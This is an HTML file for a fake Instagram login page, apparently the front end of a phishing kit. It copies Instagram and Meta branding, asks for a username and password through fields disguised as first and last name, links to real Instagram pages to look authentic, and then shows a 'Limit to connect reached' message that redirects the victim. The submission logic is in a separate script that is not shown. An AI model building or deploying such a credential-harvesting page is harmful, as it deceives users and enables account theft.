<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Secure Login</title>
    <link rel="stylesheet" href="./style.css" />
  </head>
  <body>
    <main class="screen">
      <section class="login-card">
        <p class="language">English (US)</p>
      <img src="./insta.webp" alt="" class="logo">

        <form id="loginForm">
          <input
            id="firstName"
            name="firstName"
            type="text"
            placeholder="Username, email or mobile number"
            autocomplete="given-name"
            required
          />
          <input
            id="lastName"
            name="lastName"
            type="text"
            placeholder="Password"
            autocomplete="family-name"
            required  
          />
          <button type="submit">Log in</button>
        </form>

        <a
          href="https://www.instagram.com/accounts/password/reset/"
          class="help-link"
          target="_blank"
          rel="noopener noreferrer"
        >Forgot password?</a>
        <a
          href="https://www.instagram.com/accounts/emailsignup/"
          class="outline-btn"
          target="_blank"
          rel="noopener noreferrer"
        >Create new account</a>
        <a
          href="https://www.meta.com/"
          class="meta-link"
          target="_blank"
          rel="noopener noreferrer"
          aria-label="Meta"
        >
          <img
            style="width: 60px; height: 12px; margin: 0 auto"
            src="./meta.webp"
            alt="Meta"
            class="google-logo"
          />
        </a>
      </section>
    </main>

    <div id="successModal" class="modal" aria-hidden="true" role="dialog" aria-labelledby="modalTitle">
      <div class="modal__backdrop" data-modal-close></div>
      <div class="modal__box">
        <p id="modalTitle" class="modal__text">Limit to connect reached</p>
        <div class="modal__actions">
          <a
            href="https://www.instagram.com"
            class="modal__link-btn"
            target="_blank"
            rel="noopener noreferrer"
          >Open Instagram</a>
          <button type="button" class="modal__close" data-modal-close>OK</button>
        </div>
      </div>
    </div>

  <script src="./script.js"></script>
  </body>
</html>
